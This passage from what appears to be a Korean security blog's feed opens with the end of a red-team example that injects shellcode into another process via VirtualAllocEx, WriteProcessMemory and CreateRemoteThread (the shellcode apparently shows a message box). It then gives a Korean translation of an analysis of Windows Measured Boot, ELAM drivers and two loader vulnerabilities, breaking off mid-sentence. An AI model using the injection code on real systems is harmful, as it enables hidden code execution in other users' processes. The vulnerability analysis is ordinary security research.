<span class="hljs-string">&quot;\xe8\x8e\xff\xff\xff\x89\x45\x08\x68\x6c\x6c\x20\x41\x68\x33&quot;</span>        <span class="hljs-string">&quot;\x32\x2e\x64\x68\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89&quot;</span>        <span class="hljs-string">&quot;\xe6\x56\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c&quot;</span>        <span class="hljs-string">&quot;\x24\x52\xe8\x5f\xff\xff\xff\x68\x6f\x78\x58\x20\x68\x61\x67&quot;</span>        <span class="hljs-string">&quot;\x65\x42\x68\x4d\x65\x73\x73\x31\xdb\x88\x5c\x24\x0a\x89\xe3&quot;</span>        <span class="hljs-string">&quot;\x68\x70\x77\x6e\x58\x68\x52\x65\x74\x32\x31\xc9\x88\x4c\x24&quot;</span>        <span class="hljs-string">&quot;\x07\x89\xe1\x31\xd2\x52\x53\x51\x52\xff\xd0\x31\xc0\x50\xff&quot;</span>        <span class="hljs-string">&quot;\x55\x08&quot;</span>;    HANDLE processHandle;    HANDLE remoteThread;    PVOID remoteBuffer;    DWORD oldPerms;    DWORD PID = <span class="hljs-number">17968</span>;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Injecting to PID: %i&quot;</span>, PID);    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);    remoteBuffer = VirtualAllocEx(processHandle, <span class="hljs-literal">NULL</span>, <span class="hljs-keyword">sizeof</span> shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READ);    WriteProcessMemory(processHandle, remoteBuffer, shellcode, <span class="hljs-keyword">sizeof</span> shellcode, <span class="hljs-literal">NULL</span>);    VirtualProtectEx(processHandle, (LPVOID)<span class="hljs-keyword">sizeof</span>(processHandle), <span class="hljs-keyword">sizeof</span>(shellcode), PAGE_READONLY, &amp;oldPerms);    remoteThread = CreateRemoteThread(processHandle, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)remoteBuffer, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);    CloseHandle(processHandle);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>process injection</tag>
      
      <tag>cpp</tag>
      
      <tag>shellcode</tag>
      
      <tag>redteam</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Translation] Measured Boot와 멀웨어 시그니처: Windows Loader에서 발견된 두 가지 취약점</title>
    <link href="/2021/06/27/l0ch/measured-boot-vuln/"/>
    <url>/2021/06/27/l0ch/measured-boot-vuln/</url>
    
    <content type="html"><![CDATA[<p>안녕하세요 L0ch입니다!</p><p>오늘은 Windows Kernel 및 Loader에서 발견된 취약점 두 개를 들고 왔는데요, 원래는 하루한줄로 간단하게 정리하려다 접할 기회가 많이 없는 Boot Security에 대한 설명 등 취약점의 이해를 돕기 위한 내용이 잘 정리되어 있더라구요. 개인적으로 재밌게 읽어서 정리도 할 겸 번역글로 남겨봤습니다!</p><p>오역과 의역덩어리 번역글이니 지적은 매우 환영이에요..!</p><blockquote><p>원문 : <a href="https://bi-zone.medium.com/measured-boot-and-malware-signatures-exploring-two-vulnerabilities-found-in-the-windows-loader-5a4fcc3c4b66">Measured Boot and Malware Signatures: exploring two vulnerabilities found in the Windows loader</a></p></blockquote><hr><h1 id="Introduction-to-Boot-Security"><a href="#Introduction-to-Boot-Security" class="headerlink" title="Introduction to Boot Security"></a>Introduction to Boot Security</h1><p>Boot Security에는 Verified Boot와 Measured Boot라는 두 가지 주요 개념이 있다.</p><h2 id="Verified-Boot"><a href="#Verified-Boot" class="headerlink" title="Verified Boot"></a>Verified Boot</h2><p>Verified Boot 프로세스는 신뢰할 수 있는 디지털 서명이 되지 않은 구성 요소가 부팅 중에 실행되지 않도록 한다. 이 프로세스는 서명되지 않았거나 제대로 서명되지 않은 부팅 구성 요소 (예 : 부팅 관리자 및 펌웨어 드라이버)가 시스템에서 실행되는 것을 차단하는 기능인 Secure Boot로 구현된다.</p><h2 id="Measured-Boot"><a href="#Measured-Boot" class="headerlink" title="Measured Boot"></a>Measured Boot</h2><p>Measured Boot 프로세스는 부팅 중 실행하기 전 모든 구성 요소를 기록한다. 이는 변조 방지 방식(tamper-proof way)으로 유지되며 신뢰할 수 있는 플랫폼 모듈 (Trusted Platform Module, TPM)을 사용하여 구현된다. TPM은 펌웨어 및 중요 운영 체제 구성 요소의 해시를 저장하는 데 사용되어 악성 프로그램이 해시를 변경하는 것을 방지한다. </p><p>Verified Boot와 Measured Boot는 동시에 사용할 수 있다. 이러한 개념과 Windows에서의 구현에 대한 기술적 세부 사항은 <a href="https://edk2-docs.gitbook.io/understanding-the-uefi-secure-boot-chain/overview">Reference [1]</a>과 <a href="https://docs.microsoft.com/en-us/windows/security/information-protection/secure-the-windows-10-boot-process">Reference [2]</a>에서 찾을 수 있다.</p><p>위 두 가지 이외에도 다음과 같이 네 가지의 개념이 있다.</p><ul><li>Post-boot verification - 부팅 이후 확인</li><li>Booting from read-only media - 읽기 전용 미디어에서 부팅</li><li>Booting from a read-only volume(image) - 읽기 전용 볼륨(이미지)에서 부팅</li><li>pre-boot verification - 부팅 전 확인</li></ul><h2 id="Post-boot-verification"><a href="#Post-boot-verification" class="headerlink" title="Post-boot verification"></a>Post-boot verification</h2><p>Post-boot verification은 부팅 프로세스가 완료된 이후 또는 후반 단계에서 시작된 프로그램에 의해 수행된다. 해당 프로그램은 이전에 실행된 OS 구성요소와 데이터의 무결성을 확인한다. 이 방식은 더 높은 권한으로 실행 중인 멀웨어의 경우 프로그램의 파일 읽기 요청을 가로채고 반환되는 파일 데이터를 제어함으로써 우회가 가능하나 그럼에도 안티 멀웨어 소프트웨어, 엔드포인트 탐지 및 대응 솔루션과 암호화 구성 요소의 미티게이션으로써 사용할 가치가 있다.</p><h2 id="Booting-from-read-only-media"><a href="#Booting-from-read-only-media" class="headerlink" title="Booting from read-only media"></a>Booting from read-only media</h2><p>읽기 전용 미디어에서 부팅하는 것은 BIOS 및 UEFI와 같은 OS 시작 전 환경(pre-OS environment)에서 사용된다. 이러한 개념이 적용된 온라인 뱅킹을 위한 실시간 배포 방식은 이미 수년 전에 <a href="http://thinkinghard.com/secureinternetbanking/index.html">제안되었으며</a> 현재는 재택근무 시 보안을 위해 제안되기도 한다. 이는 기존의 전통적인 멀웨어에 완벽하게 대응해 대부분의 멀웨어로부터 시스템을 보호할 수 있다.</p><p>그러나 악성 프로그램이 OS 이전 환경에 접근할 수 있으면 우회가 가능하다. 이동식 미디어에서 부팅되는 OS를 속여 기존 미디어에 저장된 코드를 실행할 수 있다. 이는 BIOS 또는 UEFI가 부팅 드라이브에서 데이터를 읽을 때 기본 스토리지 드라이버로 전환하는 동안 트리거할 수 있으며 관련된 코드 실행 이슈에 대한 자세한 내용은 <a href="https://dfir.ru/2018/07/21/a-live-forensic-distribution-executing-malicious-code-from-a-suspect-drive/">이전 글에서</a> 확인할 수 있다.</p><h2 id="Booting-from-a-read-only-volume"><a href="#Booting-from-a-read-only-volume" class="headerlink" title="Booting from a read-only volume"></a>Booting from a read-only volume</h2><p>읽기 전용 볼륨(이미지)에서 부팅하는 것 또한 비슷한 개념이지만 변경 불가능한 OS 파일만 읽기 전용 볼륨에 저장된다. 이 볼륨은 해시 또는 해시 트리를 사용하여 무결성을 검증한다. 해시 또는 해시 트리의 루트 해시는 하드웨어로 보호되는 루트에 의해 서명되고 검증되며 이 접근 방식은 기존의 검증된 부팅 구현과 관련이 있다. 더 자세한 기술 정보는 <a href="https://source.android.com/security/verifiedboot/verified-boot">여기</a>서 찾을 수 있다.</p><h2 id="Pre-boot-verification"><a href="#Pre-boot-verification" class="headerlink" title="Pre-boot verification"></a>Pre-boot verification</h2><p>Pre-boot verification은 잘 알려지지 않은 기술이며 일반적으로 PCI (Peripheral Component Interconnect) 장치 또는 사용자 지정 UEFI 이미지로 구현된다. 부팅 드라이브에 있는 부트 로더를 시작하기 전에 확인 프로세스는 하드웨어 구성, 노출된 펌웨어 메모리, 실행 파일 및 기타 데이터 (예 : Windows Installation의 레지스트리 키값) 등의 무결성을 확인한다. </p><p>Pre-boot verification은 이전에는 초기화 코드를 포함하는 읽기 전용 메모리 (option ROM)가 있는 PCI 장치로 구현되었다. 초기화 코드는 부트 로더의 첫 번째 명령어 위치에 중단점을 설치해 중단점에 도달하면 PCI 장치의 메모리에서 사용자 지정 OS가 시작되는 프로세스로 이루어져 있다. OS는 연결된 드라이브에서 찾은 파일 시스템을 파싱하고 확인 프로세스를 수행하는데, 이때 해시는 무결성이 확인된 시스템 드라이브 또는 PCI 장치의 메모리에 저장되며 검증에 성공하면 원래 부트 로더가 실행되고 운영체제가 시작된다.</p><p>현재는 PCI 장치에서 사용자 지정 UEFI 이미지를 메인보드에 제공하는 것으로 구현되어 있다. 사용자 지정 UEFI 이미지에는 확인 프로세스에 필요한 파서가 포함되어 있으며 USB 부팅을 위해 USB 드라이브를 기반으로 한 구현도 있다. 이전 방식과 비교해 사용자가 부팅 순서를 변경하지 않는다는 가정하에 BIOS / UEFI 환경에 대한 중단점 또는 애드온을 사용하여 부팅 프로세스에 간섭할 필요가 없다.</p><p>이 접근 방식은 BIOS 및 UEFI를 포함한 펌웨어의 무결성을 확인하는 기능이 제한되지만, 사용자 지정 UEFI 이미지를 사용하면 설계상 신뢰할 수 있는 영역에 대부분의 펌웨어를 포함하게 된다.</p><p>또 다른 단점은 공식 Windows에서 구현된 파일 시스템 및 Windows 레지스트리 파싱 코드를 동일하게 생성하는 것이 거의 불가능하다는 것이다. 일반적으로 Linux 사용자가 NTFS 파일 시스템을 마운트 하면 동일한 파일 시스템을 탐색하는 Windows 사용자와 동일한 디렉터리 레이아웃과 파일 내용이 표시된다. 그러나 Pre-boot verification은 실제로 드라이브에 저장된 원시 데이터는 동일하나 다른 데이터를 반환할 수 있다. </p><p>예를 들어 대부분의 Pre-boot verification 제품은 Windows 레지스트리 트랜잭션 로그 파일을 지원하지 않는다. 즉, Kernel 수준에서 실행되는 멀웨어가 레지스트리 키값을 수정해 Pre-boot verification에서 임의의 값을 가져오도록 할 수 있다. Windows Kernel은 트랜잭션 로그 파일을 지원하므로 이러한 변경 사항은 부팅 도중과 부팅 후에 운영체제에 표시된다. 이는 <a href="https://dfir.ru/2018/10/07/hiding-data-in-the-registry/">이전 글에서</a> 자세히 설명되어 있다.  </p><p>verified 및 measured boot 프로세스는 코드와 데이터를 사용하기 전 검증하기 때문에 앞서 설명한 공격에 대한 영향을 받지 않을 것으로 예상된다. 실행될 파일이 파일 시스템 드라이버에 따라 다른 해시를 생성하는 경우 파일이 verified 및 measured를 거쳐 동일한 드라이버로 실행되기 때문에 보안에 영향을 미치지 않는다. 그러나 이 접근 방법 또한 항상 완벽하지는 않다. 이 글에서는 Windows Loader (<code>winload.exe</code> 또는 <code>winload.efi</code>)의 measured boot에서 발견된 두 가지 취약점에 중점을 둘 것이며, 별도의 소프트웨어 구성 요소(이후에 설명할 Loader와 kernel)에서 데이터와 코드를 검증하는 과정에서의 이슈에 대해 강조한다.</p><h1 id="Early-Launch-Anti-Malware"><a href="#Early-Launch-Anti-Malware" class="headerlink" title="Early Launch Anti-Malware"></a>Early Launch Anti-Malware</h1><p>취약점을 살펴보기 전에 Windows Kernel (<code>ntoskrnl.exe</code>)에서 제공하는 안티 멀웨어 인터페이스를 살펴본다.</p><p>두 가지의 주요 부팅 보안인  verified boot와 measured boot가 활성화되어 있고 하드웨어/펌웨어 취약점을 고려하지 않는 경우 멀웨어의 초기 목표 삽입 지점은 boot-start 드라이버다.</p><p>악성 boot-start 드라이버를 방지하기 위해 Microsoft는 <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/install/early-launch-antimalware">ELAM (Early Launch Anti-Malware) 인터페이스</a>를 Windows 8에서부터 도입했다. </p><p>ELAM 드라이버는 다른 드라이버보다 먼저 시작해 종속성과 유효성을 검사한다. 각 boot-start 드라이버에 대해 ELAM 드라이버는 다음 값을 반환한다.</p><ul><li>unknown - 알 수 없음</li><li>good - 정상적인 드라이버</li><li>bad - 악성 드라이버</li><li>bad but critical for the boot - 악성 드라이버지만 부팅 프로세스에 빠져서는 안 될 요소</li></ul><p>또한 ELAM 드라이버는 boot-start 드라이버에서 수행하는 레지스트리 작업을 기록하는 콜백을 설정하고 런타임 안티 멀웨어의 구성 요소에 저장할 수 있다.</p><p>자체 ELAM 드라이버를 사용하는 안티 멀웨어 소프트웨어는 Windows 8.1에서 도입된 <a href="https://docs.microsoft.com/en-us/windows/win32/services/protecting-anti-malware-services-">코드 무결성 보호</a>가 제공되어 보호된 서비스로 실행할 수 있다. </p><p>부팅 프로세스 중에 둘 이상의 ELAM 드라이버가 활성화될 수 있으며 각 ELAM 드라이버는 지정된 boot-start 드라이버를 독립적으로 확인하며 이 드라이버에 대한 최종 결과값은 다음 순위를 기반으로 한다.</p><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled.png" alt="measured-boot-vuln/Untitled.png"></p><blockquote><p>Table 1. ELAM scores (ranks)</p></blockquote><p>한 ELAM 드라이버가 <code>good</code> 을 반환하고 다른 ELAM 드라이버가 <code>bad</code>를 반환하면 이 boot-start 드라이버는 <code>bad</code>로 결정된다.</p><p>위 ELAM 드라이버의 반환 값과 아래 정책을 기반으로 Kernel은 boot-start 드라이버를 허용하거나 거부할 수 있다.</p><ul><li>모든 드라이버 허용</li><li><code>good</code>, <code>unknown</code>, <code>bad but critical</code> 드라이버 허용(기본값)</li><li><code>good</code>, <code>unknown</code> 드라이버 허용</li><li><code>good</code> 드라이버 허용</li></ul><p>ELAM 드라이버는 다음 데이터를 기반으로 드라이버의 스코어를 결정한다.</p><ul><li>드라이버 파일의 경로</li><li>해당 서비스 항목에 대한 레지스트리 경로</li><li>드라이버에 대한 인증서 정보 (게시자, 발급자)</li><li>이미지 파일 해시값</li></ul><p>문제는 <a href="https://www.microsoft.com/security/blog/2020/09/01/force-firmware-code-to-be-measured-and-attested-by-secure-launch-on-windows-10/">DRTM (Dynamic Root of Trust for Measurement for Measurement)</a>이 적용되면 이전에 boot-start 드라이버를 메모리로 읽어오는 데 사용된 펌웨어를 신뢰할 수 없어 관련 드라이버가 초기화되기 전에는 드라이브에서 아무것도 읽을 수 없기 때문에 파일 내용이 ELAM 드라이버에 노출되지 않는다. 따라서 기존의 멀웨어 시그니처는 적용할 수 없다. 그러나 경로, 해시 및 인증서 등의 정보로 악성 boot-start 드라이버를 차단하는 것은 효과적인 방법으로 볼 수 있다.</p><p>따라서 Microsoft는 다음과 같은 새로운 규칙을 정의했다.</p><ul><li>ELAM 드라이버에는 단일 boot-start 드라이버를 확인할 수 있는 제한된 시간이 주어짐</li><li>ELAM 드라이버에는 모든 boot-start 드라이버를 확인할 수 있는 제한된 시간이 주어짐</li><li>ELAM 드라이버에는 코드 및 구성 데이터에 대해 제한된 메모리가 제공됨</li><li>ELAM 드라이버는 ELAM 레지스트리 하이브 (<code>C:\Windows\System32\config\ELAM</code>)의 특정 레지스트리 키 아래에 서명을 저장해야 함</li><li>ELAM 드라이버는 서명의 유효성을 검사해야 함.</li><li>ELAM 드라이버는 잘못된 서명을 처리해야 함 (이 경우 모든 boot-start 드라이버를 unknown으로 처리해야 함).</li><li>ELAM 드라이버는 악성 boot-start 드라이버 (또는 다른 정책 위반)가 식별되면 측정된 부팅 상태를 무효화해야 함</li></ul><p>ELAM 인터페이스가 처음 등장했을 때는 <a href="https://www.welivesecurity.com/2012/12/27/win32gapz-new-bootkit-technique/">효용성에 의문이 제기되었다</a>. bootkit은 악성코드를 VBR(Volume Boot Recod)에 기록하거나 IPL(Initial Program Loader)로 대체할 수 있으며 둘 다 Windows Kernel 이전에 실행되므로 ELAM 드라이버를 우회할 수 있었다. 그러나 Verified/Measured 부팅의 등장으로 위 기법의 적용이 어려워져 ELAM 인터페이스가 제 기능을 할 수 있게 되었다.</p><h1 id="ELAM-and-Measured-Signatures"><a href="#ELAM-and-Measured-Signatures" class="headerlink" title="ELAM and Measured Signatures"></a>ELAM and Measured Signatures</h1><p>Measured 부팅 중 ELAM 시그니처를 읽은 다음 Windows Loader에서 측정한다(<a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/install/elam-driver-requirements#malware-signatures">출처</a>). 이렇게 하면 ELAM 시그니처가 신뢰 체인에 배치되어 증명 중에 누락 혹은 다운그레이드 된 시그니처를 감지할 수 있다.</p><p>ELAM 하이브 내의 특정 레지스트리 값에 저장된 위치만 측정되며 이 값을 <code>Measured</code>, <code>Policy</code> 및 <code>Config</code>라고 한다. 여기에는 공급 업체별 데이터를 포함할 수 있고 이름이 다르거나 유형이 <code>REG_BINARY</code>가 아닌 레지스트리 값은 측정되지 않는다.</p><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%201.png" alt="measured-boot-vuln/Untitled%201.png"></p><blockquote><p>Table 2. Trend Micro 및 Microsoft에서 각각 저장한 시그니처 데이터와 측정값(굵게 표시됨)</p></blockquote><p>ELAM 시그니처는 Windows Loader에 의해 측정되지만 ELAM 인터페이스는 Windows Kernel에 의해 제공된다는 점이 중요하다.</p><h1 id="Real-World-ELAM-Drivers"><a href="#Real-World-ELAM-Drivers" class="headerlink" title="Real-World ELAM Drivers"></a>Real-World ELAM Drivers</h1><p>2021 년 2월에 필자는 유명한 안티 멀웨어 제품의 ELAM 드라이버를 리버싱했다. 25개의 ELAM 드라이버가 있는 총 26 개의 제품 (2 개의 제품이 동일한 ELAM 드라이버를 공유)에서 24 개가 기본 구성으로 설치되어 있었다. </p><p>흥미롭게도 모든 ELAM 드라이버에는 보호된 안티 멀웨어 서비스를 시작하는 데 필요한 인증서 정보가 포함되어 있지만 26개 중 15개 제품에서 boot-start 드라이버에 대해 검사를 수행하지 않고 하드코딩된 결과값을 반환하거나 결과값을 전혀 제공하지 않았다. </p><blockquote><p>이러한 ELAM 드라이버를 placeholder driver라고 한다.</p></blockquote><p>두 개의 ELAM 드라이버는 런타임 안티 멀웨어 구성 요소에 대한 boot-start 드라이버 정보를 기록했지만 ELAM 드라이버에서는 실제 검사가 수행되지 않았으며 결과값은 항상 <code>unknown</code>이었고, 한 ELAM 드라이버는 검사를 수행하지 않고 모든 boot-start 드라이버의 결과값을 <code>good</code>으로 보고했다.</p><p>11개의 제품의 ELAM 드라이버는 boot-start 드라이버에 대해 몇 가지 검사를 수행했다. 그중 하나는 알려진 정상적인 인증서의 하드코딩된 목록을 가지고 있고 ELAM 하이브는 시그니처 데이터를 저장하는 데 사용되지 않았으며 2개는 시그니처 데이터에 ELAM 하이브와 SYSTEM 하이브를 모두 사용했다. 하나는 ELAM 하이브를 사용한 뒤 SYSTEM 하이브를 시그니처 데이터 대체로 사용하고 7개의 제품은 ELAM 하이브에서만 시그니처 데이터를 읽었다.</p><p>11 개의 ELAM 드라이버 중 단 2개만 결과값에 따라 증명을 취소할 수 있었으며 다른 드라이버는 해당 루틴을 호출조차 하지 않았다.</p><p>이제 제품의 이름을 언급하도록 하겠다.</p><p>놀랍게도 Windows Defender에서 제공되는 ELAM 드라이버는 언급된 모든 규칙을 따르지 않았으며 SYSTEM 하이브를 시그니처 데이터의 저장 위치로 사용하고 (기본 위치 인 ELAM 하이브 제외) 악성 boot-start 드라이버가 감지되었을 때 증명을 취소하지 않았다.</p><p>Kaspersky 및 ZoneAlarm 제품의 동일한 ELAM 드라이버는 ELAM 하이브와 SYSTEM 하이브 두 위치에서 시그니처 데이터를 읽었으며 증명 또한 취소되지 않았다.</p><p>Sophos 제품의 ELAM 드라이버는 모든 boot-start 드라이버를 <code>good</code>으로 표시한다. 이는 Sophos에 보안 이슈로 보고되었지만 보안 상의 결함이 없는 의도된 기능으로 간주되었다.</p><p>요약하자면, 대부분의 안티 멀웨어 제품은 ELAM 드라이버를 사용하여 악성 boot-start 드라이버를 검색하지 않았다. 대신 ELAM 드라이버를 사용하여 자체적으로 보호된 서비스로 시작하고 핵심 ELAM 기능은 하드 코딩된 단일 결과값을 제공하거나 결과값을 전혀 제공하지 않도록 구현되었다.</p><h1 id="ELAM-Hive"><a href="#ELAM-Hive" class="headerlink" title="ELAM Hive"></a>ELAM Hive</h1><p>ELAM 하이브는 <code>C:\Windows\System32\config\ELAM</code> 레지스트리 파일에 저장된다.</p><p><a href="https://github.com/msuhanov/regf/blob/master/Windows%20registry%20file%20format%20specification.md">이전 글에</a> 해당 포맷에 대한 설명이 있으며 취약성을 이해하는 데 필요한 몇 가지 핵심 사항이 있다.</p><ul><li>키 노드는 하위 키 목록을 가리킬 수 있다.<ul><li>키 노드 : 단일 레지스트리 키를 설명하는 데 사용되는 바이너리 구조</li><li>하위 키 목록 : 레지스트리 키의 하위 키를 설명하는 키 노드에 대한 오프셋 목록</li></ul></li><li>마찬가지로 키 노드는 값 목록을 가리킬 수 있다.<ul><li>값 목록: 키 값에 대한 오프셋 목록, 각 키 값은 레지스트리 키에 속하는 단일 레지스트리 값을 설명함</li></ul></li><li><code>0xFFFFFFFF</code>와 같은 오프셋은 “nil”을 표현한다.</li><li>이러한 오프셋은 절댓값이 아니며 레지스트리 파일의 시작 부분에서 오프셋을 얻으려면 4096 bytes를 추가해야 한다.</li><li>키 노드와 키 값은 각각 레지스트리 키의 이름과 레지스트리 값의 이름을 저장한다. 이는 확장 ASCII (Latin-1) 문자열 혹은 UTF-16LE 문자열이다. (확장 ASCII 문자열로 저장할 수 있으면 해당 형식으로 압축됨.)</li><li>하위 키에서 대소문자를 구분하지 않는 바이너리 검색을 사용하려면 하위 키 목록을 대문자 이름(사전 순 정렬)으로 정렬해야 한다.<ul><li>값 목록은 정렬할 필요 없음</li></ul></li><li>키 값은 레지스트리 값의 데이터 유형(예 : REG_BINARY)을 저장하고 값 데이터를 가리킨다.</li><li>4 bytes 이하의 값 데이터는 키 값에 직접 저장된다.</li><li>4 bytes 보다 큰 값 데이터는 다른 오프셋에 저장되며 이 오프셋은 키 값에 기록된다.</li><li>16344 bytes보다 큰 값 데이터는 16344 btyes 이하의 세그먼트에 저장되고 세그먼트에 대한 오프셋은 목록에서 참조된다. 키 값에는 데이터 대신 목록에 대한 오프셋이 저장된 Big Data Record의 오프셋이 저장된다.</li></ul><p>레지스트리 파일의 예제는 다음과 같다.</p><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%202.png" alt="measured-boot-vuln/Untitled%202.png"></p><blockquote><p>Figure 1<br>선택된 영역 - ELAM 하이브의 root key 노드<br>녹색 - 하위 키의 개수(2개)<br>빨간색 - 하위 키 목록에 대한 오프셋 (0x3328, 절대 오프셋: 0x3328+4096=0x4328)<br>노란색 - 키 이름 (“ROOT”, ASCII 문자열)</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%203.png" alt="measured-boot-vuln/Untitled%203.png"></p><blockquote><p>Figure 2<br>선택된 영역 - 루트 키에 대한 하위 키 목록<br>노란색 - 목록의 요소 수 (2개)<br>빨간색 - 두 개의 하위 키에 대한 오프셋 (0x3188 및 0x0120, 이 유형의 하위 키 목록에서는 4 개)</p></blockquote><p>각 오프셋 뒤에는 이름 해시가 포함되어 있으며 사전 순 정렬로 저장된다. (<code>0x3188</code>은 “Trend Micro” 키 노드에 해당하고 <code>0x0120</code>은 “Windows Defender” 키 노드에 해당됨)</p><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%204.png" alt="measured-boot-vuln/Untitled%204.png"></p><blockquote><p>Figure 3<br>선택된 영역 - “Windows Defender” 키 노드<br>빨간색 - 값 데이터(1)<br>노란색 - 목록에 대한 오프셋 (0x3180)</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%205.png" alt="measured-boot-vuln/Untitled%205.png"></p><blockquote><p>Figure 4<br>선택된 영역 - 값 목록(유효한 항목은 0x0230)</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%206.png" alt="measured-boot-vuln/Untitled%206.png"></p><blockquote><p>Figure 5<br>선택된 영역 - 키 값<br>노란색 - 데이터 크기 (0x215C 또는 8540 bytes)<br>빨간색 - 데이터 오프셋 (0x1020, 데이터가 4 bytes 이하인 경우 직접 저장)<br>파란색 - 값 유형 (3 또는 REG_BINARY)<br>녹색 - 값 이름 ( “Measured”, ASCII 문자열)</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%207.png" alt="measured-boot-vuln/Untitled%207.png"></p><blockquote><p>Figure 6<br>값 데이터</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%208.png" alt="measured-boot-vuln/Untitled%208.png"></p><blockquote><p>Figure 7<br>선택된 영역 - 데이터가 16344 bytes보다 크고 하이브 형식 버전이 1.4 이상인 경우의 Big Data Record Structure<br>빨간색 - 데이터 세그먼트 수 (2),<br>노란색 - 세그먼트 목록에 대한 오프셋 (0x3188)</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%209.png" alt="measured-boot-vuln/Untitled%209.png"></p><blockquote><p>Figure 8<br>선택된 영역 - 값 데이터 세그먼트 목록<br>빨간색 - 두 개의 오프셋 (0x4020 및 0x 8020)</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2010.png" alt="measured-boot-vuln/Untitled%2010.png"></p><blockquote><p>Figure 9<br>선택된 영역 - 세그먼트, 첫 번째 세그먼트에는 16344 bytes가 포함되고 마지막 세그먼트에는 나머지 데이터가 포함됨</p></blockquote><p>유심히 봐야 할 몇 가지 세부 사항</p><ol><li>레지스트리 하이브가 로드되면 형식 위반이 있는지 확인한다. 위반이 감지되면 참조를 포함하여 이를 수정하거나 관련 레지스트리를 삭제하려고 시도한다.</li><li>모든 하위 키 목록에 있는 요소의 사전 순 정렬이 확인된다. 두 개의 하위 키 (주어진 목록에 있는 현재 키와 이전 키)를 비교한 결과 잘못된 순서로 표시되면 현재 키가 삭제된다.</li><li>일반적으로 하이브가 마운트 되면 유저 모드 응용 프로그램이 잠기게 된다. 따라서 운영체제가 부팅을 완료하면 ELAM 하이브는 마운트 해제된 상태로 유지된다.</li><li>ELAM 하이브는 형식 버전 1.5를 사용하므로 Big Data Record가 활성화된다.</li><li>부팅 중에 Windows Loader는 ELAM 하이브를 단일 메모리 청크로 읽는다.</li></ol><h1 id="Measured-Boot-Vulnerabilities"><a href="#Measured-Boot-Vulnerabilities" class="headerlink" title="Measured Boot Vulnerabilities"></a>Measured Boot Vulnerabilities</h1><p>2020년 말, 2021년 초 관리자 권한으로 실행되는 악성 프로그램이 Measured Booting 프로세스에 영향을 주지 않고 ELAM 시그니처를 손상 및 삭제할 수 있는 두 가지 취약점을 발견하고 보고했다.</p><p>특히, Windows Loader는 ELAM 하이브에서 예상되는 레지스트리 값을 측정하는 반면 Windows Kernel은 손상된 ELAM 시그니처를 포함하거나 해당 레지스트리 값이 없는 하이브에서 다른 레지스트리 데이터를 확인해 이러한 Loader와 Kernel의 레지스트리 파싱 코드의 차이점을 악용한다.</p><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2011.png" alt="measured-boot-vuln/Untitled%2011.png"></p><blockquote><p>발견된 취약점의 CVE ID</p></blockquote><p>두 취약점 모두 보상을 받을 수 있었으며 CVE-2021–27094의 경우 업데이트를 배포하는 데 90일 이상이 걸렸고 해당 패치로 인해 데이터 손상 이슈가 발생했다.</p><h2 id="CVE-2021–28447"><a href="#CVE-2021–28447" class="headerlink" title="CVE-2021–28447"></a>CVE-2021–28447</h2><p>16344 bytes보다 큰 데이터로 ELAM 값을 측정할 때 Windows Loader는 Big Data Record를 파싱하지 않는다. 따라서 측정 중인 ELAM blob이 16344 bytes보다 크면 취약점을 트리거할 수 있다. 아래는 측정된 ELAM 값에 대한 데이터를 가져오는 데 사용되는 디 컴파일된 함수이다.</p><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2012.png" alt="measured-boot-vuln/Untitled%2012.png"></p><blockquote><p>측정 값 데이터를 가져 오는 데 사용되는 함수</p></blockquote><p>일반적인 경우 값 데이터가 16344 bytes 보다 크지 않으면 <code>KeyValue-&gt;Data</code> 필드에는 전체 값 데이터가 포함되고 <code>memmove()</code> 함수로 해당 필드의 데이터를 변수 <code>Heap</code>에 복사한다. 그러나 해당 함수에는 하이브 형식 버전, 값 데이터 크기에 대한 검사 등 Big Data Record를 처리하기 위한 코드가 존재하지 않는다. 따라서 데이터가 16344 bytes보다 크면 <code>KeyValue-&gt;Data</code>에는 값 데이터 대신 Big Data Record로 채워지지만 <code>memmove()</code> 호출은 이를 데이터로 생각해 Big Data Record와 이후 레지스트리 데이터를 로드된 레지스트리 파일에서 <code>Heap</code>으로 복사하게 된다. </p><p>이를 악용하면 특정 조건에서 공격자는 측정에 영향을 주지 않고 ELAM Blob을 수정할 수 있다. 예를 들어 값 데이터 세그먼트가 Big Data Record 이전에, 즉 레지스트리 파일의 더 낮은 오프셋에 저장되면 힙 변수에 포함되지 않고 측정되어 실제 값 데이터는 측정되지 않는다. 또는 값 데이터 세그먼트가 Big Data Record 이후에 저장되면 측정되지 않아 측정 중 계산된 해시를 변경하지 않고 이후의 값 데이터를 변경할 수 있다.</p><p>ELAM 하이브는 부팅 완료 이후에는 로드되지 않으므로 어떤 방식으로든 (예 : HEX 편집기 등) 변경할 수 있으므로 공격자가 레지스트리 파일을 제한 없이 임의로 수정할 수 있다. </p><h3 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h3><p>이 취약점은 이전에는 Windows 